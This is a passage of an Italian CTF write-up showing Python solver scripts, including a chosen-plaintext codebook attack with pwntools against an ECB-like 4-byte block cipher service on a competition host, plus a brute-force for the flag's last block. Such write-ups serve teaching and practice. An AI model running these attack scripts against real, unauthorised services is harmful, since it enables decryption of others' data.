</span></span><span class="line"><span class="cl"><span class="n">FIELD_NAME</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;simple-encoder-solver/1.0&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_tokens</span><span class="p">(</span><span class="n">html</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">div</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="s1">&#39;encoded&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">div</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">el</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">div</span><span class="o">.</span><span class="n">find_all</span><span class="p">()</span> <span class="k">if</span> <span class="n">el</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag_tokens</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE_URL</span> <span class="o">+</span> <span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_tokens</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE_URL</span> <span class="o">+</span> <span class="s1">&#39;/encode&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">FIELD_NAME</span><span class="p">:</span> <span class="n">text</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_tokens</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_tokens</span> <span class="o">=</span> <span class="n">get_flag_tokens</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">flag_tokens</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;No tokens returned from /flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">needed</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">flag_tokens</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mapping</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ROUNDS</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">CHARSET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">tokens</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">ch</span> <span class="o">*</span> <span class="n">REPEATS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">needed</span> <span class="ow">and</span> <span class="n">t</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">mapping</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">SLEEP</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">mapping</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">needed</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">decoded</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">mapping</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">t</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">)</span> <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">flag_tokens</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Mapped </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">mapping</span><span class="p">)</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span><span class="si">}</span><span class="s2"> tokens&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">decoded</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">solve</span><span class="p">())</span>
</span></span></code></pre></div><h3 id="rule-of-x">Rule of X<a hidden class="anchor" aria-hidden="true" href="#rule-of-x">#</a></h3>
<h4 id="analisi-9">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-9">#</a></h4>
<p>Il servizio permette due cose:</p>
<ul>
<li>Cifrare una storia che contiene la flag</li>
<li>Cifrare un plaintext a scelta</li>
</ul>
<pre tabindex="0"><code>Welcome to The Dream of Poliphilus!
1. Get a story and a flag
2. Encrypt plaintext
&gt;
</code></pre><p>Cifrando alcuni plaintext, ho trovato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte (tipo ECB).</p>
<pre tabindex="0"><code>&gt; aaaa1
Ciphertext:
46d08e66 948d0fbf

&gt; aaaa
Ciphertext:
46d08e66 31a3a187

&gt; 1
Ciphertext:
948d0fbf
</code></pre><h4 id="soluzione-9">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione-9">#</a></h4>
<p>Dato che un blocco da 4 byte mappa sempre in un altro blocco da 4 byte, per decifrare l‚Äôintero testo dovremmo inviare ogni possibile combinazione di 4 caratteri da cifrare&hellip; o no?</p>
<p>In realt√†, non ci interessa l‚Äôintero testo: ci serve solo la flag. Conoscendo il formato (CTF{valoriesa}), possiamo restringere l‚Äôalfabeto da cifrare.</p>
<p>Arriviamo quindi a questa soluzione:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">trange</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alphabet</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;0123456789abcdef&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">combs</span> <span class="o">=</span> <span class="n">product</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">combs</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">),</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">100</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()[:</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mappings</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted output length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_chunk</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>            <span class="c1"># 8-byte ciphertext block</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_idx</span> <span class="o">=</span> <span class="n">i</span> <span class="o">//</span> <span class="mi">2</span>                   <span class="c1"># maps to corresponding 4-byte plaintext start</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_chunk</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">plain_idx</span><span class="p">:</span><span class="n">plain_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">mappings</span><span class="p">[</span><span class="n">enc_chunk</span><span class="p">]</span> <span class="o">=</span> <span class="n">plain_chunk</span>
</span></span><span class="line"><span class="cl">   
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_enc</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted flag length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">decoded_blocks</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">decoded_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">mappings</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="s1">&#39;????&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag_dec</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decoded_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag_dec</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>Ma c‚Äô√® un problema: questo codice non riesce a estrarre l‚Äôintera flag. L‚Äôoutput √®:</p>
<pre tabindex="0"><code>????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????F{0b3d4dd2dfa538c778f815b824da290e60ebc6d6116fcb94acc76a232fe811????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
</code></pre><p>Si nota l‚Äôinizio ‚ÄòF{&hellip;‚Äô e possiamo premettere ‚ÄòCT‚Äô, ma come ottenere l‚Äôultimo blocco?</p>
<p>Consideriamo cosa contiene l‚Äôultimo blocco: 4 caratteri, i primi due sono cifre esadecimali, poi una parentesi graffa di chiusura e un carattere casuale (ecco perch√© il primo script non poteva decodificare tutto).</p>
<p>Sulla base di questo, possiamo forzare i due caratteri esadecimali e l‚Äôultimo carattere, estraendo cos√¨ il blocco finale della flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">tup</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">255</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">.</span><span class="n">isprintable</span><span class="p">():</span> <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">brute</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">tup</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="n">brute</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="n">flag_enc</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Found matching plaintext: </span><span class="si">{</span><span class="n">brute</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">tup</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">output</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;No matching 4-byte plaintext found in given alphabet.&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Che produce -&gt; <strong><code>e7}H</code></strong></p>
<h4 id="script-8">Script<a hidden class="anchor" aria-hidden="true" href="#script-8">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">product</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">trange</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">alphabet</span> <span class="o">=</span> <span class="s1">&#39;CTF</span><span class="si">{}</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;0123456789abcdef&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">combs</span> <span class="o">=</span> <span class="n">product</span><span class="p">(</span><span class="n">alphabet</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">combs</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="mi">4</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">trange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">blocks</span><span class="p">),</span> <span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;28267ab8.ctf.ac.upt.ro&#39;</span><span class="p">,</span> <span class="mi">9323</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">100</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()[:</span><span class="o">-</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">mappings</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;Encrypted output length should be a multiple of 8&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">output</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_chunk</span> <span class="o">=</span> <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>            <span class="c1"># 8-byte ciphertext block</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_idx</span> <span class="o">=</span> <span class="n">i</span> <span class="o">//</span> <span class="mi">2</span>                   <span class="c1"># maps to corresponding 4-byte plaintext start</span>
</span></span><span class="line"><span class="cl">    <span class="n">plain_chunk</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="n">plain_idx</span><span class="p">:</span><span class="n">plain_idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
